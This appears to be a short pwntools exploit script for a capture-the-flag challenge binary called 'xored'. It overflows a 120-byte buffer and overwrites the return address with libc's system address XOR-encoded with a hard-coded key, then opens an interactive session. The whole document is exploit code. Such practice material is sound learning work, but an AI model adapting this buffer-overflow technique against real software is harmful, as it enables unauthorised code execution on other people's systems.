# keys = 0x4f43754b	0x5035634c	0x6d334849	0x6e365067 0x3346784a	0x58484244	0x53484462	0x59304d71



from pwn import *

key = "KuCOLc5PIH3mgP6nJxF3DBHXbDHSqM0Y"

libc = ELF('libc.so.6')

r = process("./xored")
gdb.attach(r)

buffer = b"A"*120
offset = b"B"*8
system_in_libc = libc.symbols['system']

log.info(f"{hex(system_in_libc)=}")

key_start = int("KuCO".encode().hex(),16)


system_xored = xor(p64(system_in_libc), p64(key_start))

log.info(f"{system_xored=}")


payload = [
    buffer,
    offset,
    system_xored
]

payload = b"".join(payload)

r.recvuntil(">")
r.sendline(payload)
r.interactive()